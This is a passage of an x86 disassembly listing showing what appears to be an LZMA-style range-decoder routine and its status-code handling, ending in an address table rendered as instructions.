  406d54:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d57:	0f b7 d0             	movzwl %ax,%edx
  406d5a:	c1 e9 0b             	shr    $0xb,%ecx
  406d5d:	0f af ca             	imul   %edx,%ecx
  406d60:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406d63:	73 18                	jae    0x406d7d
  406d65:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406d68:	b9 00 08 00 00       	mov    $0x800,%ecx
  406d6d:	2b ca                	sub    %edx,%ecx
  406d6f:	c1 f9 05             	sar    $0x5,%ecx
  406d72:	03 c8                	add    %eax,%ecx
  406d74:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406d78:	66 89 0e             	mov    %cx,(%esi)
  406d7b:	eb 19                	jmp    0x406d96
  406d7d:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406d80:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406d83:	66 8b c8             	mov    %ax,%cx
  406d86:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406d8d:	66 c1 e9 05          	shr    $0x5,%cx
  406d91:	2b c1                	sub    %ecx,%eax
  406d93:	66 89 06             	mov    %ax,(%esi)
  406d96:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406d9d:	73 25                	jae    0x406dc4
  406d9f:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406da3:	0f 84 a9 01 00 00    	je     0x406f52
  406da9:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406dac:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406daf:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406db3:	0f b6 09             	movzbl (%ecx),%ecx
  406db6:	ff 4d 94             	decl   -0x6c(%ebp)
  406db9:	c1 e0 08             	shl    $0x8,%eax
  406dbc:	0b c1                	or     %ecx,%eax
  406dbe:	ff 45 90             	incl   -0x70(%ebp)
  406dc1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406dc4:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  406dca:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  406dd0:	e9 91 f7 ff ff       	jmp    0x406566
  406dd5:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406dd9:	75 1c                	jne    0x406df7
  406ddb:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406dde:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406de1:	c1 e0 04             	shl    $0x4,%eax
  406de4:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  406deb:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  406df2:	e9 38 ff ff ff       	jmp    0x406d2f
  406df7:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  406dfe:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  406e05:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  406e0c:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  406e13:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406e16:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406e1d:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406e20:	eb 28                	jmp    0x406e4a
  406e22:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406e26:	0f 84 32 01 00 00    	je     0x406f5e
  406e2c:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406e2f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e32:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e36:	0f b6 09             	movzbl (%ecx),%ecx
  406e39:	ff 4d 94             	decl   -0x6c(%ebp)
  406e3c:	c1 e0 08             	shl    $0x8,%eax
  406e3f:	0b c1                	or     %ecx,%eax
  406e41:	ff 45 90             	incl   -0x70(%ebp)
  406e44:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406e47:	ff 4d b8             	decl   -0x48(%ebp)
  406e4a:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406e4e:	7e 5e                	jle    0x406eae
  406e50:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406e53:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e56:	c1 e9 0b             	shr    $0xb,%ecx
  406e59:	8d 14 00             	lea    (%eax,%eax,1),%edx
  406e5c:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406e5f:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406e62:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406e65:	66 8b 06             	mov    (%esi),%ax
  406e68:	0f b7 f8             	movzwl %ax,%edi
  406e6b:	0f af cf             	imul   %edi,%ecx
  406e6e:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406e71:	73 17                	jae    0x406e8a
  406e73:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406e76:	b9 00 08 00 00       	mov    $0x800,%ecx
  406e7b:	2b cf                	sub    %edi,%ecx
  406e7d:	c1 f9 05             	sar    $0x5,%ecx
  406e80:	03 c8                	add    %eax,%ecx
  406e82:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406e85:	66 89 0e             	mov    %cx,(%esi)
  406e88:	eb 16                	jmp    0x406ea0
  406e8a:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406e8d:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406e90:	66 8b c8             	mov    %ax,%cx
  406e93:	66 c1 e9 05          	shr    $0x5,%cx
  406e97:	2b c1                	sub    %ecx,%eax
  406e99:	42                   	inc    %edx
  406e9a:	66 89 06             	mov    %ax,(%esi)
  406e9d:	89 55 b0             	mov    %edx,-0x50(%ebp)
  406ea0:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406ea7:	73 9e                	jae    0x406e47
  406ea9:	e9 74 ff ff ff       	jmp    0x406e22
  406eae:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  406eb1:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  406eb4:	33 c0                	xor    %eax,%eax
  406eb6:	40                   	inc    %eax
  406eb7:	d3 e0                	shl    %cl,%eax
  406eb9:	2b d8                	sub    %eax,%ebx
  406ebb:	8b 45 84             	mov    -0x7c(%ebp),%eax
  406ebe:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406ec1:	e9 04 ff ff ff       	jmp    0x406dca
  406ec6:	01 5d d0             	add    %ebx,-0x30(%ebp)
  406ec9:	8b 45 80             	mov    -0x80(%ebp),%eax
  406ecc:	e9 f9 fe ff ff       	jmp    0x406dca
  406ed1:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  406ed8:	00 00 00 
  406edb:	e9 88 00 00 00       	jmp    0x406f68
  406ee0:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  406ee7:	00 00 00 
  406eea:	eb 7c                	jmp    0x406f68
  406eec:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  406ef3:	00 00 00 
  406ef6:	eb 70                	jmp    0x406f68
  406ef8:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  406eff:	00 00 00 
  406f02:	eb 64                	jmp    0x406f68
  406f04:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  406f0b:	00 00 00 
  406f0e:	eb 58                	jmp    0x406f68
  406f10:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  406f17:	00 00 00 
  406f1a:	eb 4c                	jmp    0x406f68
  406f1c:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  406f23:	00 00 00 
  406f26:	eb 40                	jmp    0x406f68
  406f28:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  406f2f:	00 00 00 
  406f32:	eb 34                	jmp    0x406f68
  406f34:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  406f3b:	00 00 00 
  406f3e:	eb 28                	jmp    0x406f68
  406f40:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  406f44:	eb 22                	jmp    0x406f68
  406f46:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  406f4d:	00 00 00 
  406f50:	eb 16                	jmp    0x406f68
  406f52:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  406f59:	00 00 00 
  406f5c:	eb 0a                	jmp    0x406f68
  406f5e:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  406f65:	00 00 00 
  406f68:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  406f6e:	6a 22                	push   $0x22
  406f70:	59                   	pop    %ecx
  406f71:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  406f77:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406f79:	33 c0                	xor    %eax,%eax
  406f7b:	eb 03                	jmp    0x406f80
  406f7d:	83 c8 ff             	or     $0xffffffff,%eax
  406f80:	5f                   	pop    %edi
  406f81:	5e                   	pop    %esi
  406f82:	5b                   	pop    %ebx
  406f83:	c9                   	leave
  406f84:	c3                   	ret
  406f85:	7c 65                	jl     0x406fec
  406f87:	40                   	inc    %eax
  406f88:	00 21                	add    %ah,(%ecx)
  406f8a:	66 40                	inc    %ax
  406f8c:	00 bc 66 40 00 91 66 	add    %bh,0x66910040(%esi,%eiz,2)
  406f93:	40                   	inc    %eax
  406f94:	00 51 6d             	add    %dl,0x6d(%ecx)
  406f97:	40                   	inc    %eax
  406f98:	00 9f 6d 40 00 e2    	add    %bl,-0x1dffbf93(%edi)
  406f9e:	66 40                	inc    %ax
  406fa0:	00 81 69 40 00 eb    	add    %al,-0x14ffbf97(%ecx)
  406fa6:	69 40 00 2e 6a 40 00 	imul   $0x406a2e,0x0(%eax),%eax
  406fad:	9f                   	lahf
  406fae:	6a 40                	push   $0x40
  406fb0:	00 c6                	add    %al,%dh
  406fb2:	6a 40                	push   $0x40
  406fb4:	00 86 6b 40 00 7b    	add    %al,0x7b00406b(%esi)
  406fba:	67 40                	addr16 inc %eax
  406fbc:	00 34 68             	add    %dh,(%eax,%ebp,2)
  406fbf:	40                   	inc    %eax
  406fc0:	00 f8                	add    %bh,%al
  406fc2:	68 40 00 09 6c       	push   $0x6c090040
  406fc7:	40                   	inc    %eax
  406fc8:	00 d9                	add    %bl,%cl
  406fca:	69 40 00 18 6d 40 00 	imul   $0x406d18,0x0(%eax),%eax
  406fd1:	d5 6d                	aad    $0x6d
  406fd3:	40                   	inc    %eax
  406fd4:	00 c6                	add    %al,%dh
  406fd6:	6e                   	outsb  %ds:(%esi),(%dx)
  406fd7:	40                   	inc    %eax
  406fd8:	00 00                	add    %al,(%eax)
  406fda:	6b 40 00 17          	imul   $0x17,0x0(%eax),%eax
  406fde:	6b 40 00 13          	imul   $0x13,0x0(%eax),%eax
  406fe2:	6e                   	outsb  %ds:(%esi),(%dx)
  406fe3:	40                   	inc    %eax
  406fe4:	00 22                	add    %ah,(%edx)
  406fe6:	6e                   	outsb  %ds:(%esi),(%dx)
  406fe7:	40                   	inc    %eax
  406fe8:	00 45 6b             	add    %al,0x6b(%ebp)
  406feb:	40                   	inc    %eax
  406fec:	00 c7                	add    %al,%bh
  406fee:	68 40 00 52 6a       	push   $0x6a520040
  406ff3:	40                   	inc    %eax
  406ff4:	00 cf                	add    %cl,%bh
  406ff6:	6c                   	insb   (%dx),%es:(%edi)
  406ff7:	40                   	inc    %eax
	...
